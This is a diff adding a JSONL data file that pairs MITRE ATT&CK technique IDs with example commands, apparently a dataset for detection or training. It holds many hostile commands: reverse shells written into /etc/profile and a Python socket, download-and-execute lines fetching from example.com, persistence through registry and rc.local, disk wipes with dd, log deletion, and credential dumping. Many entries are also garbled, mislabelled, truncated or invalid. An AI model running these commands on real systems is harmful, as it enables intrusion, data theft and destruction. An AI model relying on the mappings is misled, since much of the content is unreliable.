@@ -1,0 +1,835 @@
+{"mitre_id": "T1055.011", "name": "Extra Window Memory Injection", "platform": "Windows", "command": "`CreateWindowEx(0, \"Extra Window Memory\", 0, 0, 0, 0, 0, 0, 0, WS_OVERLAPPED, NULL, NULL, NULL, NULL);`"}
+{"mitre_id": "T1053.005", "name": "Scheduled Task", "platform": "Windows", "command": "schtasks /create /tn \"TaskName\" /tr \"C:\\path\\to\\malicious.exe\" /sc daily /st 00:00 /sd 01/01/2024"}
+{"mitre_id": "T1205.002", "name": "Socket Filters", "platform": "Linux", "command": "pcap_setfilter(pcap, bpf_filter, 0, 0, 0)"}
+{"mitre_id": "T1066", "name": "Indicator Removal from Tools", "platform": "Linux", "command": "`strings /path/to/malicious/file | grep -v \"indicator_string\"`"}
+{"mitre_id": "T1560.001", "name": "Archive via Utility", "platform": "Linux", "command": "tar -czvf archive.tar.gz /path/to/data"}
+{"mitre_id": "T1021.005", "name": "VNC", "platform": "Linux", "command": "vncviewer -connect <target_IP>"}
+{"mitre_id": "T1047", "name": "Windows Management Instrumentation", "platform": "Windows", "command": "wmic.exe process where \"ImageName='powershell.exe'\" call terminate"}
+{"mitre_id": "T1156", "name": "Malicious Shell Modification", "platform": "Linux", "command": "echo 'bash -c \"bash -i >& /dev/tcp/10.0.0.1/4242 0>&1\"' >> /etc/profile"}
+{"mitre_id": "T1113", "name": "Screen Capture", "platform": "Linux", "command": "import pyautogui"}
+{"mitre_id": "T1027.011", "name": "Fileless Storage", "platform": "Windows", "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"FilelessStorage\" /t REG_SZ /d \"C:\\path\\to\\malicious\\executable\""}
+{"mitre_id": "T1067", "name": "Bootkit", "platform": "Linux", "command": "dd if=/dev/zero of=/dev/sda bs=512 count=1"}
+{"mitre_id": "T1037", "name": "Boot or Logon Initialization Scripts", "platform": "macOS", "command": "launchctl load -w /Library/LaunchAgents/com.adversary.init.plist"}
+{"mitre_id": "T1557", "name": "Adversary-in-the-Middle", "platform": "Linux", "command": "`sudo apt-get install dnsrebind`"}
+{"mitre_id": "T1033", "name": "System Owner/User Discovery", "platform": "Linux", "command": "who"}
+{"mitre_id": "T1583", "name": "Acquire Infrastructure", "platform": "PRE", "command": "`az network watcher flow-log show`"}
+{"mitre_id": "T1218.011", "name": "Rundll32", "platform": "Windows", "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")"}
+{"mitre_id": "T1613", "name": "Container and Resource Discovery", "platform": "Containers", "command": "docker ps -a"}
+{"mitre_id": "T1583.007", "name": "Serverless", "platform": "PRE", "command": "aws lambda create-function --function-name \"malicious-function\" --runtime python3.9 --role arn:aws:iam::123456789012:role/LambdaRole --handler index.handler --zip-file file://malicious-function.zip"}
+{"mitre_id": "T1143", "name": "Hidden Window", "platform": "macOS", "command": "defaults write com.apple.finder AppleShowAllFiles -bool true; killall Finder"}
+{"mitre_id": "T1161", "name": "LC_LOAD_DYLIB Addition", "platform": "macOS", "command": "`otool -l -v /path/to/binary | grep LC_LOAD_DYLIB`"}
+{"mitre_id": "T1132.001", "name": "Standard Encoding", "platform": "ESXi", "command": "base64 -d -i /path/to/encoded/file"}
+{"mitre_id": "T1027.009", "name": "Embedded Payloads", "platform": "Linux", "command": "`msfvenom -p linux/x64/exec CMD=\"bash -c 'bash -c /bin/sh'\" -f elf -o payload.elf`"}
+{"mitre_id": "T1150", "name": "Plist Modification", "platform": "macOS", "command": "defaults write /Library/Preferences/com.apple.loginitems.plist LSHandlers -array-add '{\"LSHandlerContentType\" = \"public.file-url\"; \"LSHandlerRole\" = \"None\"; \"LSHandlerURL\" = \"file:///path/to/malicious/executable\"; \"LSHandlerURLScheme\" = \"file\"}'"}
+{"mitre_id": "T1556.003", "name": "Pluggable Authentication Modules", "platform": "Linux", "command": "`sudo grep -r pam_unix.so /etc/pam.d/*`"}
+{"mitre_id": "T1578.004", "name": "Revert Cloud Instance", "platform": "IaaS", "command": "aws restore-snapshot --description \"Reverted instance\" --snapshot-id snap-123456abcdef --instance-id i-1234567890abcdef"}
+{"mitre_id": "T1148", "name": "HISTCONTROL", "platform": "Linux", "command": "export HISTCONTROL=ignorespace"}
+{"mitre_id": "T1592", "name": "Gather Victim Host Information", "platform": "PRE", "command": "nmap -sV <target_IP>"}
+{"mitre_id": "T1596.003", "name": "Digital Certificates", "platform": "PRE", "command": "`powershell -c \"Import-Module ActiveDirectory; Get-ADObject -Filter * | Select-Object -ExpandProperty DistinguishedName\"`"}
+{"mitre_id": "T1056.001", "name": "Keylogging", "platform": "Linux", "command": "`sudo apt-get install xkeysnow`"}
+{"mitre_id": "T1564.012", "name": "File/Path Exclusions", "platform": "Linux", "command": "`ls -a /var/log/`"}
+{"mitre_id": "T1222.002", "name": "Linux and Mac File and Directory Permissions Modification", "platform": "macOS", "command": "chmod 777 /path/to/file_or_directory"}
+{"mitre_id": "T1110.001", "name": "Password Guessing", "platform": "Windows", "command": "net user username password"}
+{"mitre_id": "T1216.001", "name": "PubPrn", "platform": "Windows", "command": "cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com"}
+{"mitre_id": "T1597.002", "name": "Purchase Technical Data", "platform": "PRE", "command": "python purchase_technical_data.py"}
+{"mitre_id": "T1003", "name": "OS Credential Dumping", "platform": "Linux", "command": "`mimikatz`"}
+{"mitre_id": "T1129", "name": "Shared Modules", "platform": "Linux", "command": "dlopen(\"/path/to/malicious.so\", RTLD_LAZY)"}
+{"mitre_id": "T1602", "name": "Data from Configuration Repository", "platform": "Network Devices", "command": "`show run`"}
+{"mitre_id": "T1561.002", "name": "Disk Structure Wipe", "platform": "Linux", "command": "dd if=/dev/zero of=/dev/sda bs=1M count=1"}
+{"mitre_id": "T1498.001", "name": "Direct Network Flood", "platform": "Windows", "command": "`netsh.exe interface ip set interface \"ip_address\" add neighbors=127.0.0.1`"}
+{"mitre_id": "T1492", "name": "Stored Data Manipulation", "platform": "Linux", "command": "`echo \"Hello World\" > /var/log/syslog`"}
+{"mitre_id": "T1574.007", "name": "Path Interception by PATH Environment Variable", "platform": "Windows", "command": "setx PATH \"C:\\example path;C:\\Windows\\system32;C:\\Windows\""}
+{"mitre_id": "T1213.002", "name": "Sharepoint", "platform": "Windows", "command": "powershell -c \"Get-SPWeb -SiteUrl 'https://sharepoint-site-url.sharepoint.com' | Get-SPSite\""}
+{"mitre_id": "T1006", "name": "Direct Volume Access", "platform": "Network Devices", "command": "`ninjaCopy`"}
+{"mitre_id": "T1044", "name": "File System Permissions Weakness", "platform": "Windows", "command": "icacls C:\\Windows\\System32\\svchost.exe /inheritance:r"}
+{"mitre_id": "T1588.007", "name": "Artificial Intelligence", "platform": "PRE", "command": "python pre-processor.py --target=\"AI-generated phishing campaign\""}
+{"mitre_id": "T1666", "name": "Modify Cloud Resource Hierarchy", "platform": "IaaS", "command": "aws organizations leave-organization --from-aws-organization-id <ORGANIZATION_ID> --resource-id <ACCOUNT_ID>"}
+{"mitre_id": "T1564.008", "name": "Email Hiding Rules", "platform": "Windows", "command": "New-InboxRule -Name \"RuleName\" -SubjectContainsText \"malware\" -MoveToFolder \"Deleted Items\""}
+{"mitre_id": "T1491.002", "name": "External Defacement", "platform": "Windows", "command": "`net stop w3svc`"}
+{"mitre_id": "T1027.013", "name": "Encrypted/Encoded File", "platform": "Linux", "command": "`base64 -d <<< \"SGVsbG8gd29ybGQh\" > output.txt`"}
+{"mitre_id": "T1171", "name": "LLMNR/NBT-NS Poisoning and Relay", "platform": "Windows", "command": "responder -I eth0 -lvv -d 192.168.1.0/24"}
+{"mitre_id": "T1590.005", "name": "IP Addresses", "platform": "PRE", "command": "nmap -sS -oN - 192.168.1.0/24"}
+{"mitre_id": "T1499.001", "name": "OS Exhaustion Flood", "platform": "Linux", "command": "`hping3 -S -c 10000 -a 192.168.1.100`"}
+{"mitre_id": "T1014", "name": "Rootkit", "platform": "Linux", "command": "`sudo apt-get install rkhunter`"}
+{"mitre_id": "T1546.013", "name": "PowerShell Profile", "platform": "Windows", "command": "New-Item -Path $PROFILE -ItemType File -Value 'Invoke-WebRequest http://example.com/malicious.ps1 -Method Get -UseBasicParsing; Invoke-Expression (New-Object System.Net.WebClient).DownloadString(\"http://example.com/malicious.ps1\")'"}
+{"mitre_id": "T1059.007", "name": "JavaScript", "platform": "Linux", "command": "node <script_name>.js"}
+{"mitre_id": "T1590.002", "name": "DNS", "platform": "PRE", "command": "dig +nocmd +multiline @ns1.example.com example.com axfr"}
+{"mitre_id": "T1501", "name": "Systemd Service", "platform": "Linux", "command": "systemctl enable my_malicious_service.service"}
+{"mitre_id": "T1485.001", "name": "Lifecycle-Triggered Deletion", "platform": "IaaS", "command": "aws iam put-bucket-lifecycle-configuration --bucket <bucket_name> --lifecycle-configuration '{\"Rules\": [{\"Expiration\": {\"Date\": \"1 day\"}}]}"}
+{"mitre_id": "T1514", "name": "Elevated Execution with Prompt", "platform": "macOS", "command": "AuthorizationExecuteWithPrivileges(\"/path/to/malicious/script\")"}
+{"mitre_id": "T1123", "name": "Audio Capture", "platform": "Linux", "command": "arecord -f cd -t wav -d 10 -t wav /tmp/audio.wav"}
+{"mitre_id": "T1543", "name": "Create or Modify System Process", "platform": "Windows", "command": "sc config <service_name> start= auto & net start <service_name>"}
+{"mitre_id": "T1133", "name": "External Remote Services", "platform": "Containers", "command": "docker exec -it <container_id> /bin/bash"}
+{"mitre_id": "T1109", "name": "Component Firmware", "platform": "Windows", "command": "wmic bios get safebootmode"}
+{"mitre_id": "T1546.006", "name": "LC_LOAD_DYLIB Addition", "platform": "macOS", "command": "`otool -l -v /path/to/malicious/binary | grep LC_LOAD_DYLIB | awk '{print $1}' | xargs otool -l -v -add_load_dylib /path/to/malicious/binary --load_dylib_path /path/to/malicious/dylib`"}
+{"mitre_id": "T1539", "name": "Steal Web Session Cookie", "platform": "Linux", "command": "`python -c 'import requests; s = requests.Session(); s.cookies = {\"session_id\": \"stolen_session_cookie\"}'"}
+{"mitre_id": "T1053.007", "name": "Container Orchestration Job", "platform": "Containers", "command": "kubectl create job malicious-deployment --image=<image-name> --schedule=\"0 0 * * *\""}
+{"mitre_id": "T1568.002", "name": "Domain Generation Algorithms", "platform": "Linux", "command": "`dig istgmxdejdnxuyla.ru`"}
+{"mitre_id": "T1036.007", "name": "Double File Extension", "platform": "Windows", "command": "`attrib -h \"C:\\path\\to\\file.txt.exe\"`"}
+{"mitre_id": "T1548.002", "name": "Bypass User Account Control", "platform": "Windows", "command": "rundll32.exe C:\\Windows\\System32\\cmd.exe, /c calc.exe"}
+{"mitre_id": "T1099", "name": "Timestomp", "platform": "Linux", "command": "`touch -r /path/to/reference/file /path/to/file/to/timestomp`"}
+{"mitre_id": "T1496.003", "name": "SMS Pumping", "platform": "SaaS", "command": "twilio send_message('+1234567890', 'Hello, this is a test message')"}
+{"mitre_id": "T1016.001", "name": "Internet Connection Discovery", "platform": "Windows", "command": "`ping -n 1 8.8.8.8`"}
+{"mitre_id": "T1548.003", "name": "Sudo and Sudo Caching", "platform": "Linux", "command": "echo 'Defaults!tty_tickets' >> /etc/sudoers"}
+{"mitre_id": "T1560.003", "name": "Archive via Custom Method", "platform": "Linux", "command": "python -c 'import zlib; import os; f = open(\"file.txt\", \"rb\"); data = f.read(); f.close(); compressed = zlib.compress(data); open(\"archived_file.txt\", \"wb\").write(compressed)'"}
+{"mitre_id": "T1578", "name": "Modify Cloud Compute Infrastructure", "platform": "IaaS", "command": "aws ec2 modify-instance-attribute --instance-id i-0123456789abcdef0 --attribute instance-type --value c5.xlarge"}
+{"mitre_id": "T1584.008", "name": "Network Devices", "platform": "PRE", "command": "nmap -sC -sV 192.168.1.0/24"}
+{"mitre_id": "T1583.008", "name": "Malvertising", "platform": "PRE", "command": "`python -c 'import requests; r = requests.get(\"https://example.com/malicious-ad\"); r.raise_for_status(); open(\"malicious-ad.html\", \"wb\").write(r.content)'`"}
+{"mitre_id": "T1069", "name": "Permission Groups Discovery", "platform": "Containers", "command": "`getent group`"}
+{"mitre_id": "T1114", "name": "Email Collection", "platform": "Windows", "command": "net use \\\\server\\share /user:domain\\username password"}
+{"mitre_id": "T1003.002", "name": "Security Account Manager", "platform": "Windows", "command": "reg save HKLM\\sam sam"}
+{"mitre_id": "T1596.002", "name": "WHOIS", "platform": "PRE", "command": "whois example.com"}
+{"mitre_id": "T1542.001", "name": "System Firmware", "platform": "Windows", "command": "bcdedit /set {bootmgr} bootsequence multi(0)disk(1)rdisk(0)partition(1)\\EFI\\Microsoft\\Boot\\bootmgfw.efi"}
+{"mitre_id": "T1594", "name": "Search Victim-Owned Websites", "platform": "PRE", "command": "dir /s /b \"C:\\path\\to\\website\\root\\directory\""}
+{"mitre_id": "T1069.003", "name": "Cloud Groups", "platform": "SaaS", "command": "az ad user get-member-groups"}
+{"mitre_id": "T1574.011", "name": "Services Registry Permissions Weakness", "platform": "Windows", "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters\" /v AutodiaDLL /t REG_SZ /d \"c:\\temp\\foo.dll\""}
+{"mitre_id": "T1596.001", "name": "DNS/Passive DNS", "platform": "PRE", "command": "dig @ns1.example.com example.com"}
+{"mitre_id": "T1499.003", "name": "Application Exhaustion Flood", "platform": "Windows", "command": "`powershell -c \"while($true){Invoke-WebRequest -Uri 'http://targetwebsite.com/resource-intensive-feature'}\"`"}
+{"mitre_id": "T1163", "name": "Rc.common", "platform": "macOS", "command": "echo 'echo \"malicious command\" | sudo bash' >> /etc/rc.common"}
+{"mitre_id": "T1195.001", "name": "Compromise Software Dependencies and Development Tools", "platform": "Linux", "command": "`git clone https://github.com/adversary-repo/malicious-action.git && cd malicious-action && chmod +x malicious-action &&./malicious-action`"}
+{"mitre_id": "T1588.004", "name": "Digital Certificates", "platform": "PRE", "command": "certutil.exe -dspublish -f -f \"Root\" \"C:\\path\\to\\malicious_root_cert.cer\""}
+{"mitre_id": "T1583.002", "name": "DNS Server", "platform": "PRE", "command": "`netsh interface ip set dns \"Local Area Connection\" static 8.8.8.8`"}
+{"mitre_id": "T1561", "name": "Disk Wipe", "platform": "Linux", "command": "dd if=/dev/zero of=/dev/sdb bs=4096 count=1"}
+{"mitre_id": "T1071.004", "name": "DNS", "platform": "Linux", "command": "dig +short TXT example.com @resolver1.example.com"}
+{"mitre_id": "T1552.005", "name": "Cloud Instance Metadata API", "platform": "IaaS", "command": "curl http://169.254.169.254/latest/meta-data/instance-id"}
+{"mitre_id": "T1555.002", "name": "Securityd Memory", "platform": "Linux", "command": "gdb -q -p $(pgrep securityd)"}
+{"mitre_id": "T1615", "name": "Group Policy Discovery", "platform": "Windows", "command": "gpresult /r"}
+{"mitre_id": "T1542.003", "name": "Bootkit", "platform": "Linux", "command": "`dd if=/dev/zero of=/dev/sda bs=512 count=1`"}
+{"mitre_id": "T1025", "name": "Data from Removable Media", "platform": "Linux", "command": "lsblk"}
+{"mitre_id": "T1116", "name": "Code Signing", "platform": "macOS", "command": "spctl validate --type execute --verbose /path/to/binary"}
+{"mitre_id": "T1218.013", "name": "Mavinject", "platform": "Windows", "command": "C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL"}
+{"mitre_id": "T1522", "name": "Cloud Instance Metadata API", "platform": "IaaS", "command": "curl http://169.254.169.254/latest/meta-data/instance-id"}
+{"mitre_id": "T1093", "name": "Process Hollowing", "platform": "Windows", "command": "`powershell -c \"Add-Type -TypeDefinition '[DllImport(\\\"kernel32.dll\\\")] public static class Win32{public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId); public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, int dwFreeType); public static extern IntPtr VirtualAlloc(IntPtr hProcess, IntPtr lpAddress, int dwSize, int flAllocationType, int dwAlign); public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOf"}
+{"mitre_id": "T1074.001", "name": "Local Data Staging", "platform": "ESXi", "command": "`vmkfstools -D -b /path/to/stage/location`"}
+{"mitre_id": "T1036.005", "name": "Match Legitimate Resource Name or Location", "platform": "Containers", "command": "`kubectl create deployment legitimate-svc --image=<malicious-image>`"}
+{"mitre_id": "T1172", "name": "Domain Fronting", "platform": "Linux", "command": "openssl s_client -connect example.com:443 -servername example.net -servername example.com -servername example.io"}
+{"mitre_id": "T1587.003", "name": "Digital Certificates", "platform": "PRE", "command": "certutil.exe -addstore -f -f \"ROOT\" \"C:\\path\\to\\selfsignedcert.cer\""}
+{"mitre_id": "T1565.001", "name": "Stored Data Manipulation", "platform": "Linux", "command": "`echo \"Hello World\" > /var/log/syslog`"}
+{"mitre_id": "T1110.002", "name": "Password Cracking", "platform": "Linux", "command": "john --format=raw-md5 --wordlist=/path/to/dictionary.txt /path/to/hashes.txt"}
+{"mitre_id": "T1178", "name": "SID-History Injection", "platform": "Windows", "command": "net localgroup \"Enterprise Admins\" /add \"S-1-5-21-1234567890-1234567890-1234567890-500\""}
+{"mitre_id": "T1114.001", "name": "Local Email Collection", "platform": "Windows", "command": "dir C:\\Users\\<username>\\Documents\\Outlook Files\\*.ost | findstr \"size:\""}
+{"mitre_id": "T1555.001", "name": "Keychain", "platform": "macOS", "command": "security dump-keychain -d"}
+{"mitre_id": "T1547", "name": "Boot or Logon Autostart Execution", "platform": "Linux", "command": "sudo echo 'echo \"bash -c \\'bash -c \\'/bin/bash -c /path/to/malicious/script.sh\\'\\' > /etc/rc.local' | sudo tee -a /etc/rc.local'"}
+{"mitre_id": "T1003.004", "name": "LSA Secrets", "platform": "Windows", "command": "reg add \"HKLM\\SECURITY\\Policy\\Secrets\" /ve /f"}
+{"mitre_id": "T1013", "name": "Port Monitors", "platform": "Windows", "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\" /v Local Port /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f"}
+{"mitre_id": "T1600", "name": "Weaken Encryption", "platform": "Network Devices", "command": "`show run | include crypto`"}
+{"mitre_id": "T1606.002", "name": "SAML Tokens", "platform": "SaaS", "command": "Get-ADFSRelyingPartyTrust | where {$_.Identifier -eq \"https://example.com\"} | Set-ADFSRelyingPartyTrust -AccessTokenLifetime 1"}
+{"mitre_id": "T1192", "name": "Spearphishing Link", "platform": "Windows", "command": "`powershell -c \"Invoke-WebRequest -Uri 'https://example.com/malicious.exe' -OutFile C:\\Users\\username\\Downloads\\malware.exe\"`"}
+{"mitre_id": "T1036.008", "name": "Masquerade File Type", "platform": "Linux", "command": "mv /tmp/malicious_payload /tmp/test.gif"}
+{"mitre_id": "T1489", "name": "Service Stop", "platform": "ESXi", "command": "vmware-cmd -g \"stop <service_name>\""}
+{"mitre_id": "T1587.001", "name": "Malware", "platform": "PRE", "command": "python setup.py sdist"}
+{"mitre_id": "T1121", "name": "Regsvcs/Regasm", "platform": "Windows", "command": "regasm /codebase /uninstall \"C:\\path\\to\\malicious.dll\""}
+{"mitre_id": "T1652", "name": "Device Driver Discovery", "platform": "Linux", "command": "lsmod"}
+{"mitre_id": "T1206", "name": "Sudo Caching", "platform": "Linux", "command": "echo 'Defaults timestamp_timeout=1' >> /etc/sudoers"}
+{"mitre_id": "T1087.002", "name": "Domain Account", "platform": "Linux", "command": "ldapsearch -x -H ldap://<domain_controller_ip> -D \"<domain\\\\username>\" -W -b \"dc=<domain>,dc=<domain_suffix>\" \"(objectClass=user)\""}
+{"mitre_id": "T1547.014", "name": "Active Setup", "platform": "Windows", "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{GUID}\" /v StubPath /t REG_SZ /d \"C:\\path\\to\\malware.exe\""}
+{"mitre_id": "T1564", "name": "Hide Artifacts", "platform": "Linux", "command": "`systemctl mask /path/to/artifact`"}
+{"mitre_id": "T1559.002", "name": "Dynamic Data Exchange", "platform": "Windows", "command": "`reg add \"HKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" /v BypassProtectedViewSettings /t REG_DWORD /d 1`"}
+{"mitre_id": "T1204.002", "name": "Malicious File", "platform": "Linux", "command": "`cp /path/to/malicious_file.iso /home/user/Desktop && chmod +x /home/user/Desktop/malicious_file.iso && mv /home/user/Desktop/malicious_file.iso /home/user/Desktop/executable_file.iso`"}
+{"mitre_id": "T1591.003", "name": "Identify Business Tempo", "platform": "PRE", "command": "python social_media_monitor.py"}
+{"mitre_id": "T1063", "name": "Security Software Discovery", "platform": "macOS", "command": "ps aux | grep -i \"LittleSnitch\""}
+{"mitre_id": "T1071.005", "name": "Publish/Subscribe Protocols", "platform": "macOS", "command": "`mosquitto_pub -h 192.168.1.100 -t \"home/temperature\" -m \"Hello, world!\"`"}
+{"mitre_id": "T1592.001", "name": "Hardware", "platform": "PRE", "command": "nmap -sV <target_IP>"}
+{"mitre_id": "T1080", "name": "Taint Shared Content", "platform": "Windows", "command": "cmd /c \"copy C:\\malware.exe C:\\path\\to\\shared\\directory\\executable.exe && copy C:\\path\\to\\shared\\directory\\executable.exe C:\\path\\to\\shared\\directory\\executable.exe.bak && move C:\\path\\to\\shared\\directory\\executable.exe.bak C:\\path\\to\\shared\\directory\\executable.exe\""}
+{"mitre_id": "T1484.002", "name": "Trust Modification", "platform": "Identity Provider", "command": "`az ad federated-domain enable`"}
+{"mitre_id": "T1213.006", "name": "Databases", "platform": "Linux", "command": "mysql -e \"SELECT * FROM table_name\""}
+{"mitre_id": "T1573.001", "name": "Symmetric Cryptography", "platform": "ESXi", "command": "esxcli network firewall ruleset 0 --add-rule --protocol=tcp --dport=443 --action=accept"}
+{"mitre_id": "T1087.001", "name": "Local Account", "platform": "ESXi", "command": "esxcli system account list"}
+{"mitre_id": "T1167", "name": "Securityd Memory", "platform": "macOS", "command": "gdb -q -p $(pgrep securityd)"}
+{"mitre_id": "T1586.001", "name": "Social Media Accounts", "platform": "PRE", "command": "python social_media_accounts.py"}
+{"mitre_id": "T1176.001", "name": "Browser Extensions", "platform": "Linux", "command": "`sudo cp /path/to/malicious_extension.crx /usr/lib/mozilla/extensions/{12345678-1234-1234-1234-123456789012}.crx`"}
+{"mitre_id": "T1527", "name": "Application Access Token", "platform": "SaaS", "command": "`curl -X POST -H \"Authorization: Bearer <access_token>\" https://api.example.com/endpoint`"}
+{"mitre_id": "T1562.009", "name": "Safe Mode Boot", "platform": "Windows", "command": "bcdedit /set {current} safeboot minimal"}
+{"mitre_id": "T1180", "name": "Screensaver", "platform": "Windows", "command": "reg add \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.exe /t REG_SZ /d \"C:\\path\\to\\malicious\\scr\\file.scr\" /f"}
+{"mitre_id": "T1542.005", "name": "TFTP Boot", "platform": "Network Devices", "command": "tftp -i 192.168.1.100 -c /path/to/malicious/image"}
+{"mitre_id": "T1543.003", "name": "Windows Service", "platform": "Windows", "command": "sc create \"Malicious Service\" binPath= \"C:\\path\\to\\malicious.exe\" start= auto"}
+{"mitre_id": "T1568.001", "name": "Fast Flux DNS", "platform": "Linux", "command": "`dig +short A example.com @8.8.8.8`"}
+{"mitre_id": "T1497.001", "name": "System Checks", "platform": "Linux", "command": "`dmidecode -s system-product-name`"}
+{"mitre_id": "T1053.003", "name": "Cron", "platform": "Linux", "command": "crontab -e"}
+{"mitre_id": "T1069.002", "name": "Domain Groups", "platform": "Linux", "command": "ldapsearch -x -H ldaps://ldap.example.com -D \"cn=admin,dc=example,dc=com\" -W -b \"dc=example,dc=com\" \"(objectClass=groupOfUniqueNames)\""}
+{"mitre_id": "T1588.006", "name": "Vulnerabilities", "platform": "PRE", "command": "nmap -sV <target_IP>"}
+{"mitre_id": "T1566.002", "name": "Spearphishing Link", "platform": "Identity Provider", "command": "`GET https://example.com/oauth2/v2.0/authorize?client_id=1234567890&response_type=code&redirect_uri=https://example.com/callback&scope=openid&state=1234567890`"}
+{"mitre_id": "T1165", "name": "Startup Items", "platform": "macOS", "command": "mv /Library/StartupItems/MyStartupItem/StartupParameters.plist /Library/StartupItems/MyStartupItem/StartupParameters.plist"}
+{"mitre_id": "T1070.002", "name": "Clear Linux or Mac System Logs", "platform": "Linux", "command": "`sudo rm -rf /var/log/*`"}
+{"mitre_id": "T1499.004", "name": "Application or System Exploitation", "platform": "Windows", "command": "net stop w3svc"}
+{"mitre_id": "T1137", "name": "Office Application Startup", "platform": "Windows", "command": "reg add \"HKCU\\Software\\Microsoft\\Office\\16.0\\Outlook\\Setup\" /v \"Persistant\" /t REG_DWORD /d 1"}
+{"mitre_id": "T1218.004", "name": "InstallUtil", "platform": "Windows", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe \"C:\\path\\to\\malicious.dll\""}
+{"mitre_id": "T1598.003", "name": "Spearphishing Link", "platform": "PRE", "command": "`curl -X GET 'http://example.com/phishing-page'`"}
+{"mitre_id": "T1021.004", "name": "SSH", "platform": "ESXi", "command": "vim-cmd hostsvc/enable_ssh"}
+{"mitre_id": "T1098.003", "name": "Additional Cloud Roles", "platform": "IaaS", "command": "aws iam create-policy --policy-name \"AdditionalRolesPolicy\" --policy-document '{\"Version\": \"2012-10-17\", \"Statement\": [{\"Effect\": \"Allow\", \"Action\": \"s3:*\", \"Resource\": \"*\"}]}\"; aws iam attach-user-policy --user-id <compromised_user_id> --policy-arn arn:aws:iam::123456789012:policy/AdditionalRolesPolicy"}
+{"mitre_id": "T1547.012", "name": "Print Processors", "platform": "Windows", "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\MyPrintProcessor\\Driver\" /ve /t REG_SZ /d \"C:\\path\\to\\malicious.dll\""}
+{"mitre_id": "T1089", "name": "Disabling Security Tools", "platform": "Linux", "command": "pkill -9 auditd"}
+{"mitre_id": "T1487", "name": "Disk Structure Wipe", "platform": "Windows", "command": "wmic diskdrive where interface=\"IDE\\Device\\IdeChannel\\0\" call destroy"}
+{"mitre_id": "T1566.001", "name": "Spearphishing Attachment", "platform": "Linux", "command": "`curl -o /tmp/malicious_file.zip http://example.com/malicious_file.zip && unzip /tmp/malicious_file.zip && chmod +x /tmp/malicious_file && /tmp/malicious_file`"}
+{"mitre_id": "T1214", "name": "Credentials in Registry", "platform": "Windows", "command": "reg query HKLM /f password /t REG_SZ /s"}
+{"mitre_id": "T1027.008", "name": "Stripped Payloads", "platform": "macOS", "command": "`otool -l /path/to/malicious_binary`"}
+{"mitre_id": "T1559.001", "name": "Component Object Model", "platform": "Windows", "command": "reg add \"HKCR\\CLSID\\{00021401-0000-0000-c000-000000000046}\" /ve /t REG_SZ /d \"C:\\path\\to\\malicious.dll\""}
+{"mitre_id": "T1574.001", "name": "DLL", "platform": "Windows", "command": "`reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MaliciousDLL\" /t REG_SZ /d \"C:\\path\\to\\malicious.dll\"`"}
+{"mitre_id": "T1119", "name": "Automated Collection", "platform": "IaaS", "command": "aws s3 sync s3://bucket-name /local/directory"}
+{"mitre_id": "T1115", "name": "Clipboard Data", "platform": "Linux", "command": "pbpaste"}
+{"mitre_id": "T1003.007", "name": "Proc Filesystem", "platform": "Linux", "command": "`grep -E \"^[0-9a-f-]* r\" /proc/$pid/maps | cut -d''-f 1`"}
+{"mitre_id": "T1583.005", "name": "Botnet", "platform": "PRE", "command": "python -c 'import socket,subprocess; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"target_ip\",port)); subprocess.call([\"/bin/sh\",\"-c\",\"bash -i >& /dev/tcp/target_ip/port 0>&1\"])'"}
+{"mitre_id": "T1555.005", "name": "Password Managers", "platform": "Linux", "command": "`gdb --batch --command=\"pwndbg commands\" --args /path/to/password_manager_process`"}
+{"mitre_id": "T1103", "name": "AppInit DLLs", "platform": "Windows", "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs /t REG_SZ /d \"path\\to\\malicious.dll\" /f"}
+{"mitre_id": "T1553.001", "name": "Gatekeeper Bypass", "platform": "macOS", "command": "`xattr -d com.apple.quarantine /path/to/file`"}
+{"mitre_id": "T1675", "name": "ESXi Administration Command", "platform": "ESXi", "command": "vmware-cmd -g \"start /bin/bash\""}
+{"mitre_id": "T1608.004", "name": "Drive-by Target", "platform": "PRE", "command": "nmap -sC -sV <target_IP>"}
+{"mitre_id": "T1007", "name": "System Service Discovery", "platform": "Linux", "command": "crontab -l"}
+{"mitre_id": "T1040", "name": "Network Sniffing", "platform": "Linux", "command": "tshark -i any -w sniff.cap"}
+{"mitre_id": "T1017", "name": "Application Deployment Software", "platform": "Linux", "command": "sudo apt-get install <malicious_software>"}
+{"mitre_id": "T1553.002", "name": "Code Signing", "platform": "macOS", "command": "spctl validate --type execute --verbose /path/to/executable"}
+{"mitre_id": "T1530", "name": "Data from Cloud Storage", "platform": "IaaS", "command": "aws s3 ls"}
+{"mitre_id": "T1565.003", "name": "Runtime Data Manipulation", "platform": "Linux", "command": "`echo \"Hello, World!\" | sed's/World/Earth/'`"}
+{"mitre_id": "T1552.002", "name": "Credentials in Registry", "platform": "Windows", "command": "reg query HKCU /f password /t REG_SZ /s"}
+{"mitre_id": "T1135", "name": "Network Share Discovery", "platform": "Linux", "command": "nmblookup -A <remote_system>"}
+{"mitre_id": "T1120", "name": "Peripheral Device Discovery", "platform": "Linux", "command": "lshw -c"}
